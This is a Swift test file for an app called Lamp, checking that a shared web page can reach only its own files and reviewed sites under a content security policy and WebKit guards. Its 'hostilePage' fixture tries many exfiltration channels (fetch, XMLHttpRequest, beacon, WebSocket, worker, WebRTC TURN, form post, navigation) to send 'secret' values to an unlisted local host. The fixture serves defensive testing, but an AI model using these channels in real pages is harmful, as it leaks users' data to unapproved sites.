import Network
import WebKit
import XCTest
@testable import Lamp
@testable import LampRelayKit

/// A page shared with this person reaches only its own files and the exact sites its review named: the policy is read
/// from the code the sheet read, carried in the app's Info.plist, and served with every file of the page, where WebKit
/// refuses everything else.
final class SharedNetworkTests: XCTestCase {
    func testSitesAreExact() {
        XCTAssertEqual(NetworkPolicy.origin("https://API.Open-Meteo.com/v1/forecast?x=1"), "https://api.open-meteo.com")
        XCTAssertEqual(NetworkPolicy.origin("https://example.com:443/"), "https://example.com")
        XCTAssertEqual(NetworkPolicy.origin("wss://relay.example:8443/socket"), "wss://relay.example:8443")
        XCTAssertEqual(NetworkPolicy.origin("http://127.0.0.1:8080"), "http://127.0.0.1:8080")
        XCTAssertNil(NetworkPolicy.origin("lamp-web-app://app/index.html"))
        XCTAssertNil(NetworkPolicy.origin("data:text/plain,hi"))
        // Nothing that could end a source list early.
        XCTAssertNil(NetworkPolicy.origin("https://a.example;script-src*/"))

        let policy = NetworkPolicy(origins: ["https://api.open-meteo.com/v1"])
        let own = "lamp-web-app://app"
        XCTAssertTrue(policy.allows(URL(string: "https://api.open-meteo.com/v1/forecast")!, own: own))
        XCTAssertFalse(policy.allows(URL(string: "http://api.open-meteo.com/v1/forecast")!, own: own), "another scheme is another site")
        XCTAssertFalse(policy.allows(URL(string: "https://api.open-meteo.com:8443/")!, own: own), "another port is another site")
        XCTAssertFalse(policy.allows(URL(string: "https://open-meteo.com/")!, own: own))
        XCTAssertTrue(policy.allows(URL(string: "lamp-web-app://app/sounds/rain.mp3")!, own: own))
        XCTAssertFalse(policy.allowsFrame(URL(string: "https://api.open-meteo.com/")!, own: own), "a site it may fetch from is never a frame of it")
        let csp = policy.contentSecurityPolicy(own: own) ?? ""
        XCTAssertTrue(csp.contains("connect-src 'self' lamp-web-app://app https://api.open-meteo.com data: blob:"), csp)
        XCTAssertTrue(csp.contains("frame-src 'self' lamp-web-app://app blob:"), csp)
        XCTAssertNil(NetworkPolicy(origins: ["https://x.example"], unrestricted: true).contentSecurityPolicy(own: own))
    }

    /// A site its host lets the page connect to (Lamp's relay in the TV preview) is only for connecting: nothing is loaded
    /// from it, and only its exact port is open.
    func testAConnectionOnlySiteIsOnlyConnectedTo() {
        let own = "lamp-tv://app"
        let csp = NetworkPolicy(origins: ["https://api.example"]).contentSecurityPolicy(own: own, connect: ["ws://127.0.0.1:61234/", "not a site"]) ?? ""
        let directives = Dictionary(csp.split(separator: ";").map {
            let parts = $0.trimmingCharacters(in: .whitespaces).split(separator: " ", maxSplits: 1)
            return (String(parts[0]), parts.count > 1 ? String(parts[1]) : "")
        }, uniquingKeysWith: { a, _ in a })
        XCTAssertEqual(directives["connect-src"], "'self' lamp-tv://app https://api.example ws://127.0.0.1:61234 data: blob:", csp)
        for (name, sources) in directives where name != "connect-src" {
            XCTAssertFalse(sources.contains("127.0.0.1"), "\(name) loads nothing from it: \(csp)")
        }
        XCTAssertFalse(csp.contains("not a site"))
    }

    func testTheSitesAreTheOnesTheSheetNamed() throws {
        // Lamp's own Native.swift and three.js, which a test run has none of Lamp's resources for.
        let root = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let stock = try String(contentsOf: root.appendingPathComponent("Resources/GameKit/apple/Native.swift"), encoding: .utf8)
        let known = Sharing.knownLibraries, native = Sharing.stockNative
        defer { Sharing.knownLibraries = known; Sharing.stockNative = native }
        Sharing.stockNative = stock
        let three = root.appendingPathComponent("Resources/WebLibraries")
        for path in FileManager.default.subpaths(atPath: three.path) ?? [] where path.hasSuffix(".js") {
            if let text = try? String(contentsOf: three.appendingPathComponent(path), encoding: .utf8) { Sharing.knownLibraries.insert(Sharing.fingerprint(text)) }
        }

        let house = try RepoImport.open(folder: StarterTrees.tree("thelittlehouse"))
        defer { try? FileManager.default.removeItem(at: house.folder) }
        XCTAssertEqual(SharedNetwork.reading(of: house, stock: stock), NetworkPolicy(origins: [], mayConnect: false, ownSwift: false))

        let home = try RepoImport.open(folder: StarterTrees.tree("homehq"))
        defer { try? FileManager.default.removeItem(at: home.folder) }
        let policy = SharedNetwork.reading(of: home, stock: stock)
        XCTAssertTrue(policy.ownSwift, "Home HQ answers its page with Swift of its own (calendars, photos)")

        // What it's held to is what its sheet says: the sites it names, by their hosts, and "may connect" for what the
        // reading couldn't follow (Home HQ's forecast address, built in a name other files give values too).
        for (package, policy) in [(house, SharedNetwork.reading(of: house, stock: stock)), (home, policy)] {
            let labels = Sharing.inspect(package).detected.map(\.label)
            let hosts = Set(policy.origins.compactMap { URL(string: $0)?.host })
            let named = labels.first { $0.hasPrefix("Connects to ") }
            XCTAssertEqual(named, TVFiles.connects(WebReach.Result(hosts: hosts))?.label, "\(labels)")
            XCTAssertEqual(policy.mayConnect, labels.contains(TVFiles.mayConnect.label), "\(labels)")
            XCTAssertEqual(policy.ownSwift, labels.contains(Sharing.ownSwift.label), "\(labels)")
        }
        XCTAssertEqual(policy.origins, ["https://geocoding-api.open-meteo.com"])
        XCTAssertTrue(policy.mayConnect)
    }

    /// Any Swift of the sender's beside the page runs where the page's limits don't reach, not only a Native.swift of
    /// its own: a web app may bring other Swift files in Sources/, which its build compiles.
    func testAnySwiftOfTheSendersIsSaidToReachAnySite() throws {
        let stock = "// Lamp's own Native.swift\nenum Native { static func register() {} }\n"
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("lamp-own-swift-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: folder) }
        func write(_ text: String, _ path: String) throws {
            let url = folder.appendingPathComponent(path)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try text.write(to: url, atomically: true, encoding: .utf8)
        }
        try write(#"{"exportedAt": "2026-01-01T00:00:00Z", "format": 12, "name": "Notes", "platform": "web-app"}"#, "lamp-app.json")
        try write("<!DOCTYPE html><p>Notes</p>", "Web/index.html")
        try write(stock, "Sources/Native.swift")
        let plain = try Sharing.open(unpacked: folder)
        XCTAssertFalse(SharedNetwork.hasOwnSwift(plain, stock: stock), "Lamp's own Native.swift is no Swift of the sender's")

        try write("import Foundation\nlet leak = URLSession.shared\n", "Sources/Helper.swift")
        let more = try Sharing.open(unpacked: folder)
        XCTAssertTrue(more.sources.contains { more.path(of: $0) == "Sources/Helper.swift" }, "the file travels as code")
        XCTAssertTrue(SharedNetwork.hasOwnSwift(more, stock: stock))
        XCTAssertTrue(SharedNetwork.reading(of: more, stock: stock).ownSwift)
    }

    /// An update undone puts back what its apps reached, and leaves no policy for an app it added: a later app made in
    /// that folder is the same instance, and would take it for its own.
    func testAnUndoneUpdateLeavesTheWishsPoliciesAsTheyWere() throws {
        let kept = SharedNetwork.folder
        SharedNetwork.folder = FileManager.default.temporaryDirectory.appendingPathComponent("lamp-network-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: SharedNetwork.folder); SharedNetwork.folder = kept }
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("wish")
        let wish = LampProject(id: "wish", name: "Wish", exe: "Wish", dir: dir, instance: UUID().uuidString)
        func part(_ folder: String) -> LampProject {
            LampProject(id: Parts.id(wish: wish.id, folder: folder), name: "Wish", exe: "Wish", dir: dir.appendingPathComponent(folder),
                        instance: Parts.instance(wish: wish, folder: folder), partOf: wish.id)
        }
        let tv = part("TV"), added = part("iPhone")
        try SharedNetwork.save(NetworkPolicy(origins: ["https://old.example"]), for: wish)
        try SharedNetwork.save(NetworkPolicy(origins: ["https://tv.example"]), for: tv)
        let before = SharedNetwork.snapshot([wish, tv])

        // The update writes the new sites, and a part it adds gets its own, before something fails.
        try SharedNetwork.save(NetworkPolicy(origins: ["https://new.example"]), for: wish)
        try SharedNetwork.save(NetworkPolicy(origins: ["https://new-tv.example"]), for: tv)
        try SharedNetwork.save(NetworkPolicy(origins: ["https://added.example"]), for: added)
        SharedNetwork.restore(before, apps: [tv, added])

        XCTAssertEqual(SharedNetwork.policy(for: wish)?.origins, ["https://old.example"])
        XCTAssertEqual(SharedNetwork.policy(for: tv)?.origins, ["https://tv.example"])
        XCTAssertNil(SharedNetwork.policy(for: added), "a part the undone update added leaves no policy behind")
    }

    func testTheAppCarriesItInItsInfoPlist() throws {
        let policy = NetworkPolicy(origins: ["https://api.open-meteo.com", "wss://relay.example:8443"], mayConnect: true, ownSwift: true)
        let plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict>\n\(policy.plistLines)\n</dict></plist>"
        let read = try PropertyListSerialization.propertyList(from: Data(plist.utf8), format: nil) as? [String: Any]
        XCTAssertEqual(NetworkPolicy(plist: read?[NetworkPolicy.plistKey]), policy)
        XCTAssertNil(NetworkPolicy(plist: nil), "an app the person made has none")
    }

    // MARK: - A hostile page in WebKit

    /// A page that tries every way out it has to a site its review never named, and once to the one it did. Served as
    /// a shared page is, every way it tries goes nowhere; served as the person's own app is, they arrive.
    @MainActor func testAHostilePagesRequestsToAnUnlistedSiteNeverArrive() async throws {
        let listed = try Listener(), unlisted = try Listener()
        defer { listed.stop(); unlisted.stop() }
        let (listedPort, unlistedPort) = try await (listed.port(), unlisted.port())
        let page = Self.hostilePage(listed: "http://127.0.0.1:\(listedPort)", unlisted: "http://127.0.0.1:\(unlistedPort)")

        // As the person's own app: no policy, and the page's requests leave.
        let open = try await Self.serve(page, policy: nil)
        XCTAssertFalse(unlisted.paths.isEmpty, "with no policy the page's requests reach the unlisted site")
        let opened = unlisted.paths
        print("Served as the person's own app, the unlisted site heard: \(opened.sorted())")
        unlisted.paths = []; listed.paths = []
        _ = open

        // Shared: held to the one site its review named.
        let shared = try await Self.serve(page, policy: NetworkPolicy(origins: ["http://127.0.0.1:\(listedPort)"]))
        print("Served as a shared page, the unlisted site heard: \(unlisted.paths.sorted()); the listed one: \(listed.paths.sorted())")
        XCTAssertEqual(unlisted.paths, [], "every request to the unlisted site was stopped (without the policy these arrived: \(opened))")
        XCTAssertTrue(listed.paths.contains("/listed-fetch"), "the site it was shared with still answers: \(listed.paths)")
        _ = shared
    }

    /// A held game reaches its own relay, at a port named before its document was served and owned until it quits, and
    /// nothing else on this Mac: not an unrelated listener while the relay runs, and neither that nor anything that
    /// could take the relay's place after the session stops.
    @MainActor func testAHeldGameReachesItsOwnRelayAndNoOtherListenerEvenAfterItStops() async throws {
        let (runtime, folder) = try Self.heldRuntime()
        defer { runtime.stop(); try? FileManager.default.removeItem(at: folder) }
        let unrelated = try Listener()
        defer { unrelated.stop() }
        let other = "127.0.0.1:\(try await unrelated.port())"

        let sites = runtime.pageSites()
        let port = try XCTUnwrap(sites.first.flatMap { URL(string: $0)?.port })
        XCTAssertFalse(runtime.isRunning, "a port kept for the page is no session")
        XCTAssertTrue(Self.isTaken(port), "the port is the game's before its document is served")

        let (status, answer) = runtime.startNow()
        XCTAssertEqual(status, 200)
        let link = try XCTUnwrap((answer["links"] as? [[String: Any]])?.first)
        XCTAssertEqual(link["socket"] as? String, sites[0] + "/", "the page is told the address its rules name")
        let relayJSON = try await URLSession.shared.data(from: URL(string: "http://127.0.0.1:\(try XCTUnwrap(runtime.pagePort))/lamp-relay.json")!).0
        let phonePort = try XCTUnwrap((JSONSerialization.jsonObject(with: relayJSON) as? [String: Any])?["port"] as? Int)
        XCTAssertNotEqual(phonePort, port, "phones join at a port of their own, which closes with the session")

        let view = try await Self.serve("""
            <!DOCTYPE html><script>
            window.said = [];
            function reach(url) {
              var s = new WebSocket(url), name = url.split('//')[1];
              s.onmessage = function (e) { said.push(name + ' ' + JSON.parse(e.data).role); };
              s.onopen = function () { s.send(\(Self.quoted(["t": "hello", "app": "padgame", "credential": link["credential"] as Any]))); };
              s.onerror = function () { said.push(name + ' error'); };
            }
            reach('\(sites[0])/');
            reach('ws://\(other)/open');
            fetch('http://\(other)/open-fetch').catch(function () {});
            </script>
            """, policy: NetworkPolicy(origins: []), connect: sites, scheme: "lamp-game")
        func run(_ script: String) async -> [String] {
            await withCheckedContinuation { done in view.evaluateJavaScript(script) { value, _ in done.resume(returning: value as? [String] ?? []) } }
        }
        func said() async -> [String] { await run("said") }
        let first = await said()
        XCTAssertTrue(first.contains("127.0.0.1:\(port)/ host"), "the page's own relay lets it in: \(first)")
        XCTAssertEqual(unrelated.paths, [], "the unrelated listener heard nothing")

        // The session ends while the page stays open: its port still answers to nothing but the game.
        runtime.stop()
        XCTAssertFalse(runtime.isRunning)
        try await Task.sleep(for: .seconds(1))
        XCTAssertTrue(Self.isTaken(port), "a stopped relay's port stays the game's: a live page's rules name it")
        XCTAssertFalse(Self.isTaken(phonePort), "phones' port closes with the session")
        _ = await run("""
            said = [];
            reach('\(sites[0])/');
            reach('ws://\(other)/stopped');
            fetch('http://\(other)/stopped-fetch').catch(function () {});
            0
            """)
        try await Task.sleep(for: .seconds(2))
        let stopped = await said()
        XCTAssertFalse(stopped.contains("127.0.0.1:\(port)/ host"), "no session, no way in: \(stopped)")
        XCTAssertEqual(unrelated.paths, [], "after the relay stops the unrelated listener still hears nothing")

        // The next session is at the same address, and what the last one handed out gets nowhere.
        let again = runtime.startNow()
        XCTAssertEqual(((again.answer["links"] as? [[String: Any]])?.first?["socket"] as? String), sites[0] + "/")
        _ = await run("said = []; reach('\(sites[0])/'); 0")
        try await Task.sleep(for: .seconds(1))
        let stale = await said()
        XCTAssertFalse(stale.contains("127.0.0.1:\(port)/ host"), "an earlier session's credential is turned away: \(stale)")
    }

    /// A port that can't be kept is another service's: the pages named it, so they're told to go, and the rules that
    /// follow name only the one the game has now.
    func testAHeldPortLostToAnotherServiceRetiresThePages() throws {
        let (runtime, folder) = try Self.heldRuntime()
        defer { runtime.stop(); try? FileManager.default.removeItem(at: folder) }
        let moved = expectation(description: "the pages are told to go")
        runtime.onPagePortMoved = { moved.fulfill() }
        let port = try XCTUnwrap(runtime.pageSites().first.flatMap { URL(string: $0)?.port })

        var taker: Int32 = -1
        defer { if taker >= 0 { close(taker) } }
        runtime.loseRelay {
            for _ in 0..<100 where taker < 0 {
                taker = Self.listen(on: port)
                if taker < 0 { usleep(50_000) }
            }
        }
        XCTAssertGreaterThanOrEqual(taker, 0, "the other service took the port")
        wait(for: [moved], timeout: 5)
        let now = try XCTUnwrap(runtime.pageSites().first.flatMap { URL(string: $0)?.port })
        XCTAssertNotEqual(now, port, "rules from here on never name the port another service has")
    }

    /// A page served before there was a port (no phone page yet, or none to be had) has no rule for one: it's told to go
    /// rather than handed an address it would be refused at, and comes back with it.
    func testAPageWithNoPortInItsRulesComesBackForIt() throws {
        let (runtime, folder) = try Self.heldRuntime()
        defer { runtime.stop(); try? FileManager.default.removeItem(at: folder) }
        let moved = expectation(description: "the page is told to go")
        runtime.onPagePortMoved = { moved.fulfill() }
        XCTAssertEqual(runtime.startNow().status, 503)
        wait(for: [moved], timeout: 5)
        let sites = runtime.pageSites()
        XCTAssertEqual(sites.count, 1)
        let links = runtime.startNow().answer["links"] as? [[String: Any]]
        XCTAssertEqual(links?.first?["socket"] as? String, sites[0] + "/")
    }

    /// A later file of a page whose rules are fixed (a picture, a missing file) is no document: a port that comes with
    /// it isn't in those rules, so the page goes.
    func testAPortThatComesWithALaterFileRetiresThePage() throws {
        let (runtime, folder) = try Self.heldRuntime()
        defer { runtime.stop(); try? FileManager.default.removeItem(at: folder) }
        let moved = expectation(description: "the page is told to go")
        runtime.onPagePortMoved = { moved.fulfill() }
        let page = folder.appendingPathComponent("Phone/index.html")
        let held = try Data(contentsOf: page)
        try FileManager.default.removeItem(at: page)
        XCTAssertEqual(runtime.pageSites(), [], "a game with no phone page holds nothing")
        try held.write(to: page)   // Lamp hands it one while it's open
        XCTAssertEqual(runtime.pageSites().count, 1)
        wait(for: [moved], timeout: 5)
    }

    private static func heldRuntime() throws -> (ControllerRuntime, URL) {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("held-relay-\(UUID().uuidString)")
        let phone = folder.appendingPathComponent("Phone")
        try FileManager.default.createDirectory(at: phone, withIntermediateDirectories: true)
        try Data("<title>Pad</title>".utf8).write(to: phone.appendingPathComponent("index.html"))
        let runtime = ControllerRuntime(app: "padgame", page: phone, holdingPagePort: true)
        runtime.hosts = { ["127.0.0.1", "localhost"] }
        runtime.linkHost = { "127.0.0.1" }
        return (runtime, folder)
    }

    private static func quoted(_ value: [String: Any]) -> String {
        let json = (try? JSONSerialization.data(withJSONObject: value)).map { String(decoding: $0, as: UTF8.self) } ?? "{}"
        return "'" + json.replacingOccurrences(of: "'", with: "\\'") + "'"
    }

    /// A socket listening on 127.0.0.1 at `port` as any other service on this Mac would, or -1 when the port's taken.
    /// Reusing the address, so what only keeps it is a listener, never a closed connection still winding down.
    private static func listen(on port: Int) -> Int32 {
        let socket = Darwin.socket(AF_INET, SOCK_STREAM, 0)
        var yes: Int32 = 1
        setsockopt(socket, SOL_SOCKET, SO_REUSEADDR, &yes, socklen_t(MemoryLayout<Int32>.size))
        var address = sockaddr_in()
        address.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
        address.sin_family = sa_family_t(AF_INET)
        address.sin_port = in_port_t(port).bigEndian
        address.sin_addr.s_addr = inet_addr("127.0.0.1")
        let bound = withUnsafePointer(to: &address) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { Darwin.bind(socket, $0, socklen_t(MemoryLayout<sockaddr_in>.size)) }
        }
        guard bound == 0, Darwin.listen(socket, 1) == 0 else { close(socket); return -1 }
        return socket
    }

    private static func isTaken(_ port: Int) -> Bool {
        let socket = listen(on: port)
        if socket >= 0 { close(socket) }
        return socket < 0
    }

    /// Every way out the page has: fetch, XMLHttpRequest, a picture, a script, a style, a WebSocket, a beacon, a frame, a
    /// form, a worker, a prefetch, a preconnect (a name spelled for the site), WebRTC's TURN server, and last its own
    /// address.
    static func hostilePage(listed: String, unlisted: String) -> String {
        """
        <!DOCTYPE html><html><head><meta charset="utf-8">
        <link rel="stylesheet" href="\(unlisted)/style">
        <link rel="prefetch" href="\(unlisted)/prefetch">
        <link rel="preconnect" href="\(unlisted.replacingOccurrences(of: "127.0.0.1", with: "secret-in-a-name.localhost"))">
        </head><body>
        <img src="\(unlisted)/img">
        <iframe src="\(unlisted)/frame"></iframe>
        <form id="f" method="post" action="\(unlisted)/form"><input name="secret" value="1"></form>
        <script>
          var out = '\(unlisted)';
          fetch('\(listed)/listed-fetch').catch(function () {});
          fetch(out + '/fetch?secret=1').catch(function () {});
          var x = new XMLHttpRequest(); x.open('GET', out + '/xhr'); x.send();
          var s = document.createElement('script'); s.src = out + '/script'; document.head.appendChild(s);
          try { new WebSocket(out.replace('http', 'ws') + '/socket'); } catch (e) {}
          try { navigator.sendBeacon(out + '/beacon', 'secret'); } catch (e) {}
          try { new Worker(URL.createObjectURL(new Blob(["fetch('" + out + "/worker').catch(function(){})"]))); } catch (e) {}
          try { var rtc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:' + out.split('//')[1] + '?transport=tcp', username: 'secret', credential: 'x' }] });
                rtc.createDataChannel('d'); rtc.createOffer().then(function (o) { return rtc.setLocalDescription(o); }); } catch (e) {}
          setTimeout(function () { document.getElementById('f').submit(); }, 600);
          setTimeout(function () { location.href = out + '/navigate'; }, 1200);
        </script></body></html>
        """
    }

    /// Serves `page` from a staged folder as Lamp's preview of a shared page does (`StagedFiles`), and gives it a few
    /// seconds to try.
    @MainActor static func serve(_ page: String, policy: NetworkPolicy?, connect: [String] = [], scheme: String = "lamp-guard") async throws -> WKWebView {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("lamp-guard-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try page.write(to: folder.appendingPathComponent("index.html"), atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: folder) }
        let files = StagedFiles()
        files.folder = folder
        files.policy = policy
        files.own = "\(scheme)://app"
        files.connect = connect
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .nonPersistent()
        configuration.setURLSchemeHandler(files, forURLScheme: scheme)
        if policy != nil { XCTAssertEqual(NetworkPolicy.holdBack(configuration.preferences).count, 5, "WebKit has every switch the guard turns off") }
        let view = WKWebView(frame: NSRect(x: 0, y: 0, width: 400, height: 300), configuration: configuration)
        let watcher = Watcher(policy: policy, own: files.own)
        view.navigationDelegate = watcher
        view.load(URLRequest(url: URL(string: "\(scheme)://app/index.html")!))
        try await Task.sleep(for: .seconds(4))
        withExtendedLifetime((files, watcher)) {}
        return view
    }

    /// The preview's navigation rule (`TVPreview`'s): a shared page never leaves its own address.
    final class Watcher: NSObject, WKNavigationDelegate {
        let policy: NetworkPolicy?, own: String
        init(policy: NetworkPolicy?, own: String) { self.policy = policy; self.own = own }
        func webView(_ webView: WKWebView, decidePolicyFor action: WKNavigationAction,
                     decisionHandler: @escaping @MainActor @Sendable (WKNavigationActionPolicy) -> Void) {
            guard let url = action.request.url, let policy, !policy.allowsFrame(url, own: own) else { return decisionHandler(.allow) }
            decisionHandler(.cancel)
        }
    }

    /// A site on this Mac that notes the path of every request that reaches it.
    final class Listener: @unchecked Sendable {
        private let listener: NWListener
        private let lock = NSLock()
        private var seen: [String] = []
        var paths: [String] {
            get { lock.lock(); defer { lock.unlock() }; return seen }
            set { lock.lock(); seen = newValue; lock.unlock() }
        }

        init() throws {
            let parameters = NWParameters.tcp
            parameters.requiredLocalEndpoint = .hostPort(host: "127.0.0.1", port: .any)
            listener = try NWListener(using: parameters)
            listener.newConnectionHandler = { [weak self] connection in
                connection.start(queue: .global())
                connection.receive(minimumIncompleteLength: 1, maximumLength: 65536) { data, _, _, _ in
                    let head = data.map { String(decoding: $0, as: UTF8.self) } ?? ""
                    let path = head.split(separator: " ").dropFirst().first.map(String.init) ?? "?"
                    self?.lock.lock(); self?.seen.append(String(path.split(separator: "?").first ?? "")); self?.lock.unlock()
                    let reply = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"
                    connection.send(content: Data(reply.utf8), completion: .contentProcessed { _ in connection.cancel() })
                }
            }
            listener.start(queue: .global())
        }

        func port() async throws -> UInt16 {
            for _ in 0..<50 {
                if let port = listener.port?.rawValue, port != 0 { return port }
                try await Task.sleep(for: .milliseconds(50))
            }
            throw URLError(.cannotConnectToHost)
        }

        func stop() { listener.cancel() }
    }
}
